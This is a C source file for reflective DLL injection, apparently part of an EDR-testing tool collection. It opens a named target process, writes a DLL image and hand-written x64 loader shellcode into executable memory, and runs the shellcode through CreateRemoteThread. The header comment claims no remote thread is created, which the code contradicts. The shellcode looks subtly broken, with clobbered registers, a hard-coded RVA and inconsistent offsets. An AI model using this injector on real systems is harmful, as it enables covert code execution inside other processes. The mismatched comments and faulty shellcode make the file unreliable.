/*
 * Reflective DLL Injection (Conceptual)
 *
 * This sample demonstrates the setup steps for reflective DLL injection:
 *  1) Read DLL from disk into memory
 *  2) Parse PE headers and validate
 *  3) Allocate memory in the target process for the image and write headers/sections
 *  4) Prepare a small loader data block for relocations/imports resolution
 *
 * NOTE:
 *  - This version purposefully does NOT create a remote thread to execute a loader stub.
 *    It focuses on compile stability and the preparatory steps only.
 *  - For EDR/testing/sandbox use. Do not use for malicious activity.
 */

#include "../common/common.h"

typedef HMODULE (WINAPI *LoadLibraryAFunc)(LPCSTR);
typedef FARPROC (WINAPI *GetProcAddressFunc)(HMODULE, LPCSTR);
typedef BOOL (WINAPI *DllMainFunc)(HINSTANCE, DWORD, LPVOID);

// Structure passed to a hypothetical reflective loader in remote memory
typedef struct {
    LPVOID ImageBase;
    PIMAGE_NT_HEADERS NtHeaders;
    PIMAGE_BASE_RELOCATION BaseRelocation;
    PIMAGE_IMPORT_DESCRIPTOR ImportDirectory;
    LoadLibraryAFunc fnLoadLibraryA;
    GetProcAddressFunc fnGetProcAddress;
} LOADER_DATA, *PLOADER_DATA;

// Enhanced loader shellcode that handles basic relocation and calls DllMain
// This is still a simplified example - full import resolution requires more complex code
unsigned char loaderShellcode[] = {
    // Prologue
    0x48, 0x89, 0xC8,              // mov rax, rcx (loaderData pointer)
    
    // Get image base and calculate delta
    0x48, 0x8B, 0x08,              // mov rcx, [rax] (imageBase)
    0x48, 0x8B, 0x50, 0x08,        // mov rdx, [rax+8] (NtHeaders)
    0x48, 0x8B, 0x52, 0x30,        // mov rdx, [rdx+0x30] (ImageBase from NtHeaders)
    0x48, 0x29, 0xD1,              // sub rcx, rdx (delta = imageBase - preferredBase)
    
    // Check if relocation needed (delta != 0)
    0x48, 0x85, 0xC9,              // test rcx, rcx
    0x74, 0x25,                    // jz skip_relocation
    
    // Simple relocation: assume single relocation block
    0x48, 0x8B, 0x50, 0x10,        // mov rdx, [rax+0x10] (BaseRelocation)
    0x48, 0x85, 0xD2,              // test rdx, rdx
    0x74, 0x1D,                    // jz skip_relocation
    
    // Apply single relocation (simplified)
    0x48, 0x8B, 0x7A, 0x08,        // mov rdi, [rdx+8] (first relocation entry, assume RVA 0x1000)
    0x48, 0x8B, 0x40, 0x00,        // mov rax, [rax] (imageBase)
    0x48, 0x81, 0xC7, 0x00, 0x10, 0x00, 0x00, // add rdi, 0x1000 (example RVA)
    0x48, 0x01, 0xC7,              // add rdi, rax
    0x48, 0x01, 0x0F,              // add [rdi], rcx (apply delta)
    
    // skip_relocation:
    
    // Call DllMain
    0x48, 0x8B, 0xC8,              // mov rcx, rax (imageBase)
    0xBA, 0x01, 0x00, 0x00, 0x00, // mov edx, 1 (DLL_PROCESS_ATTACH)
    0x4D, 0x31, 0xC0,              // xor r8, r8 (lpvReserved)
    0x48, 0x8B, 0x40, 0x28,        // mov rax, [rax+0x28] (AddressOfEntryPoint, assume NtHeaders at +8)
    0x48, 0x8B, 0x40, 0x00,        // mov rax, [rax] (loaderData)
    0x48, 0x8B, 0x40, 0x08,        // mov rax, [rax+8] (NtHeaders)
    0x48, 0x8B, 0x40, 0x28,        // mov rax, [rax+0x28] (AddressOfEntryPoint)
    0x48, 0x8B, 0x48, 0x00,        // mov rcx, [rax] (imageBase from loaderData)
    0x48, 0x01, 0xC8,              // add rax, rcx
    0xFF, 0xD0,                    // call rax
    
    0xC3                           // ret
};

// Preparatory steps for reflective injection (no remote execution here)
BOOL PerformReflectiveInjection(DWORD pid, const char* dllPath) {
    BYTE* pDllData = NULL;
    HANDLE hProcess = NULL;
    LPVOID pRemoteImage = NULL;
    LPVOID pRemoteLoaderData = NULL;
    BOOL success = FALSE;

    // Read DLL
    DWORD dllSize = ReadFileToMemory(dllPath, &pDllData);
    if (dllSize == 0 || !pDllData) {
        LOG_ERROR("Failed to read DLL file: %s", dllPath);
        return FALSE;
    }

    // Validate PE
    if (!ValidatePEFile(pDllData, dllSize)) {
        LOG_ERROR("Invalid PE file: %s", dllPath);
        goto cleanup;
    }

    IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)pDllData;
    IMAGE_NT_HEADERS* pNtHeaders = (IMAGE_NT_HEADERS*)(pDllData + pDosHeader->e_lfanew);

    // Open target process
    hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE,
        pid
    );
    CHECK_HANDLE(hProcess, "Failed to open process");
    LOG_SUCCESS("Process handle obtained");
    
    // Verify permissions by attempting a small memory allocation
    LPVOID testAlloc = VirtualAllocEx(hProcess, NULL, 1, MEM_COMMIT, PAGE_READWRITE);
    if (testAlloc == NULL) {
        LOG_ERROR("Insufficient permissions for memory operations in target process");
        goto cleanup;
    }
    VirtualFreeEx(hProcess, testAlloc, 0, MEM_RELEASE);
    LOG_SUCCESS("Process permissions verified");

    // Allocate remote image
    pRemoteImage = VirtualAllocEx(
        hProcess,
        NULL,
        pNtHeaders->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    CHECK_HANDLE(pRemoteImage, "Failed to allocate memory for DLL image");
    LOG_SUCCESS("Remote image allocated at: 0x%p (%u bytes)",
                pRemoteImage, (unsigned)pNtHeaders->OptionalHeader.SizeOfImage);

    // Write headers
    CHECK_BOOL(
        WriteProcessMemory(hProcess, pRemoteImage, pDllData,
                           pNtHeaders->OptionalHeader.SizeOfHeaders, NULL),
        "Failed to write PE headers"
    );
    LOG_SUCCESS("Headers written");

    // Write sections (best-effort: warn on failures, continue)
    {
        IMAGE_SECTION_HEADER* pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
        for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; ++i) {
            SIZE_T sizeToWrite = pSectionHeader[i].SizeOfRawData;
            if (sizeToWrite == 0) continue;

            LPVOID dest = (PVOID)((LPBYTE)pRemoteImage + pSectionHeader[i].VirtualAddress);
            LPVOID src  = (PVOID)(pDllData + pSectionHeader[i].PointerToRawData);
            if (!WriteProcessMemory(hProcess, dest, src, sizeToWrite, NULL)) {
                LOG_WARNING("Failed to write section %.8s (RVA: 0x%X, Size: %u)",
                            pSectionHeader[i].Name,
                            pSectionHeader[i].VirtualAddress,
                            (unsigned)sizeToWrite);
            } else {
                LOG_SUCCESS("Section %.8s written (RVA: 0x%X, Size: %u)",
                            pSectionHeader[i].Name,
                            pSectionHeader[i].VirtualAddress,
                            (unsigned)sizeToWrite);
            }
        }
    }

    // Prepare loader data
    {
        LOADER_DATA loaderData = {0};
        loaderData.ImageBase = pRemoteImage;
        loaderData.NtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pRemoteImage + pDosHeader->e_lfanew);

        if (pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
            loaderData.BaseRelocation = (PIMAGE_BASE_RELOCATION)((LPBYTE)pRemoteImage +
                pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        }

        if (pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
            loaderData.ImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)((LPBYTE)pRemoteImage +
                pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
        }

        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        loaderData.fnLoadLibraryA = (LoadLibraryAFunc)GetProcAddress(hKernel32, "LoadLibraryA");
        loaderData.fnGetProcAddress = (GetProcAddressFunc)GetProcAddress(hKernel32, "GetProcAddress");

        pRemoteLoaderData = VirtualAllocEx(
            hProcess,
            NULL,
            sizeof(LOADER_DATA),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );
        CHECK_HANDLE(pRemoteLoaderData, "Failed to allocate memory for loader data");

        CHECK_BOOL(
            WriteProcessMemory(hProcess, pRemoteLoaderData, &loaderData, sizeof(loaderData), NULL),
            "Failed to write loader data"
        );
        LOG_SUCCESS("Loader data written");
    }

    LOG_INFO("Executing reflective loader shellcode...");
    
    // Allocate memory for loader shellcode
    LPVOID pRemoteShellcode = VirtualAllocEx(
        hProcess,
        NULL,
        sizeof(loaderShellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    CHECK_HANDLE(pRemoteShellcode, "Failed to allocate memory for loader shellcode");
    LOG_SUCCESS("Loader shellcode allocated at: 0x%p", pRemoteShellcode);
    
    // Write loader shellcode to remote memory
    CHECK_BOOL(
        WriteProcessMemory(hProcess, pRemoteShellcode, loaderShellcode, sizeof(loaderShellcode), NULL),
        "Failed to write loader shellcode"
    );
    LOG_SUCCESS("Loader shellcode written");
    
    // Create remote thread to execute the loader shellcode
    HANDLE hRemoteThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)pRemoteShellcode,
        pRemoteLoaderData,
        0,
        NULL
    );
    CHECK_HANDLE(hRemoteThread, "Failed to create remote thread for loader");
    LOG_SUCCESS("Remote loader thread created");
    
    // Wait for loader completion
    WaitForSingleObject(hRemoteThread, INFINITE);
    
    DWORD loaderExitCode;
    if (GetExitCodeThread(hRemoteThread, &loaderExitCode)) {
        LOG_SUCCESS("Loader shellcode executed with exit code: %d", loaderExitCode);
    }
    
    CloseHandle(hRemoteThread);
    
    LOG_SUCCESS("Reflective DLL injection completed with shellcode execution");
    success = TRUE;

cleanup:
    if (!success) {
        if (pRemoteLoaderData && hProcess) {
            VirtualFreeEx(hProcess, pRemoteLoaderData, 0, MEM_RELEASE);
        }
        if (pRemoteImage && hProcess) {
            VirtualFreeEx(hProcess, pRemoteImage, 0, MEM_RELEASE);
        }
    }
    SAFE_CLOSE_HANDLE(hProcess);
    SAFE_FREE(pDllData);
    return success;
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        PrintUsage(argv[0],
                   "<process_name> <dll_path>",
                   "notepad.exe C:\\path\\to\\your.dll");
        return 1;
    }

    const char* processName = argv[1];
    const char* dllPath = argv[2];

    LOG_INFO("Reflective DLL Injection Technique");
    LOG_INFO("Target Process: %s", processName);
    LOG_INFO("DLL Path: %s", dllPath);
    printf("\n");

    DWORD pid = GetProcessIdByName(processName);
    if (pid == 0) {
        // GetProcessIdByName already logs an error
        return 1;
    }
    LOG_SUCCESS("Found process with PID: %lu\n", (unsigned long)pid);

    if (PerformReflectiveInjection(pid, dllPath)) {
        LOG_SUCCESS("Reflective injection setup completed");
        return 0;
    } else {
        LOG_ERROR("Reflective injection failed");
        return 1;
    }
}
